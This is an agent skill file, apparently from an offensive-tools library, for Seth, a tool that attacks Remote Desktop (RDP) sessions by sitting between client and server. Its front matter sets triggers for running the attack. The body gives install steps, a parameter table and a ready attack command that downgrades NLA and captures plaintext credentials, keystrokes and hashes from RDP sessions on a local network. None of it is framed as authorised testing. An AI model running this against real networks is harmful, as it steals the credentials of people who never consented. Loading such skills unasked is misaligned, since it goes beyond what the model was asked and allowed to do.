---
name: seth-rdp-mitm
description: "Seth: intercepts RDP plaintext credentials. Signals: MITM, mitm, RDP MITM, downgrade-only attack, hash harvesting."
zh-signals: "Seth: RDP 明文凭据截获。信号:中间人,mitm,RDP 中间人,仅降级攻击,哈希收割。"
when-to-use: >-
  Use when performing an RDP man-in-the-middle attack to downgrade NLA and capture plaintext credentials or hashes from RDP sessions on the local network.
---

# Seth

- Attack Category: C40 Sniffing and Man-in-the-Middle Attacks
- Upstream Repository: https://github.com/SySS-Research/Seth
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/SySS-Research/Seth && cd Seth && pip install -r requirements.txt
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `./seth.sh eth0 10.0.0.5 10.0.0.6 3389` | RDP man-in-the-middle |
| `-j` | Downgrade-only attack |
| `-h` | Hash harvesting |

## Attack Scenario Playbook

### RDP plaintext credential interception

```bash
./seth.sh eth0 10.0.0.5 10.0.0.6 3389
# Downgrade NLA to capture plaintext and keylog
```

## Notes

RDP man-in-the-middle tool by SySS: downgrades NLA and intercepts credentials.
